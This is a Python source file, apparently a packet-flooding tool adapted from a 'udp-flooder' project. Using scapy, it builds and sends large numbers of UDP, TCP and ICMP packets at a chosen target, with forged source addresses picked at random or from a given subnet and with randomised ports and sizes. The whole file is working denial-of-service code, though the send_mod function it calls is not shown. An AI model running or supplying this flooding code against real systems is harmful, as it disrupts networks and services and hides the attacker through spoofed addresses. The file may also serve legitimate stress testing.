#! /usr/bin/env python
# Base for the tool borowed from: https://github.com/celefthe/udp-flooder
import socket
import sys
import random
import os

# print(os.sys.path)
from scapy.all import *
import scapy
from scapy import *
import re
# from random import getrandbits
from ipaddress import IPv4Network, IPv4Address


def sendUDPpackets(srcAddr, dstAddr, port, requests, size, packetcount, logpath):
    source = str(
        srcAddr)  # just in case to convert to string... it can probably be removed and srcAddr can be used instead
    targ_addr = str(dstAddr)
    targ_port = int(port)
    targ_reqs = int(requests)
    packet_size = int(size)
    port_random = False
    src_random = False
    size_random = False
    subnet_random = False

    # pak = IP(dst=target, src = "100.99.98.97", ttl=ttl, flags="DF", id=id, len=1200, chksum = 0)/
    # TCP(flags="S", sport=sport, dport=int(dport), options=[('Timestamp',(0,0))], chksum = 0)

    if (int(port) == 999999):
        targ_port = 1
        # random.randrange(0,65535)
        port_random = True

    if (int(size) == 999999):
        packet_size = 1
        # int(random.randrange(0,65507))
        size_random = True
        payload = str("")
    else:
        payload = str(_generatePacket(packet_size))

    pckt = IP(dst=targ_addr) / UDP(dport=targ_port) / payload

    tmp = '/'  # this is used to search /8 /16 in the regex bellow
    # pckt=IP()/UDP()/payload
    if (source == "rand" or source == "random"):
        pckt.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        src_random = True
    elif (re.search(tmp, source)):
        try:
            # print("\nTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEST\n")
            subnet = IPv4Network(source)
            bits = random.getrandbits(subnet.max_prefixlen - subnet.prefixlen)
            pckt.src = str(IPv4Address(subnet.network_address + bits))
            # pckt.src = str(addr)
            subnet_random = True

        except ValueError:
            print("Something is wrong! packet dispatch ")

    else:
        pckt.src = source
        # print(source)
    # implement requests
    # print(str(subnet_random))
    send_mod(pckt, loop=1, port_random_flag=port_random, size_random_flag=size_random, src_random_flag=src_random,
             specific_subnet_random=subnet_random, source_addr=source, count=targ_reqs, pcktcount=packetcount, log=logpath)
    return


def sendTCPpackets(srcAddr, dstAddr, port, requests, size, flags, packetcount, logpath):
    source = str(
        srcAddr)  # just in case to convert to string... it can probably be removed and srcAddr can be used instead
    targ_addr = str(dstAddr)
    targ_port = int(port)
    targ_reqs = int(requests)
    packet_size = int(size)
    packet_flags = str(flags)
    port_random = False
    src_random = False
    size_random = False
    subnet_random = False

    # pak = IP(dst=target, src = "100.99.98.97", ttl=ttl, flags="DF", id=id, len=1200, chksum = 0)/
    # TCP(flags="S", sport=sport, dport=int(dport), options=[('Timestamp',(0,0))], chksum = 0)

    if (int(port) == 999999):
        targ_port = 1
        # random.randrange(0,65535)
        port_random = True

    if (int(size) == 999999):
        packet_size = 1
        # int(random.randrange(0,65507))
        size_random = True
        payload = str("")
    else:
        payload = str(_generatePacket(packet_size))

    pckt = IP(dst=targ_addr) / TCP(dport=targ_port, flags=packet_flags) / payload

    tmp = '/'  # this is used to search /8 /16 in the regex bellow
    if (source == "rand" or source == "random"):
        pckt.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        src_random = True
    elif (re.search(tmp, source)):
        try:
            # print("\nTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEST\n")
            subnet = IPv4Network(source)
            bits = random.getrandbits(subnet.max_prefixlen - subnet.prefixlen)
            pckt.src = str(IPv4Address(subnet.network_address + bits))
            # pckt.src = str(addr)
            subnet_random = True

        except ValueError:
            print("Something is wrong! packet dispatch ")

    else:
        pckt.src = source
        # print(source)
    # implement requests
    # print(str(subnet_random))
    send_mod(pckt, loop=1, port_random_flag=port_random, size_random_flag=size_random, src_random_flag=src_random,
             specific_subnet_random=subnet_random, source_addr=source, count=targ_reqs, pcktcount=packetcount, log=logpath)
    return


def sendICMPpackets(srcAddr, dstAddr, requests, size, icmp_rand, packetcount, logpath):
    source = str(
        srcAddr)  # just in case to convert to string... it can probably be removed and srcAddr can be used instead
    targ_addr = str(dstAddr)
    targ_reqs = int(requests)
    packet_size = int(size)
    icmp_rand = int(icmp_rand)
    # packet_flags=str(flags)
    port_random = False
    src_random = False
    size_random = False
    subnet_random = False

    if (int(size) == 999999):
        packet_size = 1
        # int(random.randrange(0,65507))
        size_random = True
        payload = str("")
    else:
        payload = str(_generatePacket(packet_size))

    pckt = IP(dst=targ_addr) / ICMP() / payload

    tmp = '/'  # this is used to search /8 /16 in the regex bellow
    if (source == "rand" or source == "random"):
        pckt.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        src_random = True
    elif (re.search(tmp, source)):
        try:
            subnet = IPv4Network(source)
            bits = random.getrandbits(subnet.max_prefixlen - subnet.prefixlen)
            pckt.src = str(IPv4Address(subnet.network_address + bits))
            # pckt.src = str(addr)
            subnet_random = True

        except ValueError:
            print("Something is wrong! packet dispatch ")

    else:
        pckt.src = source
        # print(source)
    # implement requests
    # print(str(subnet_random))
    send_mod(pckt, loop=1, src_random_flag=src_random, specific_subnet_random=subnet_random, source_addr=source,
             count=targ_reqs, size_random_flag=size_random, pcktcount=packetcount, log=logpath)
    return


def _generatePacket(size):
    chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A',
             'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
             'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
             'X', 'T', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
             'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
             'u', 'v', 'w', 'x', 'y', 'z']

    packet = ""
    for i in range(0, size):
        packet += chars[random.randint(0, 60)]

    return packet
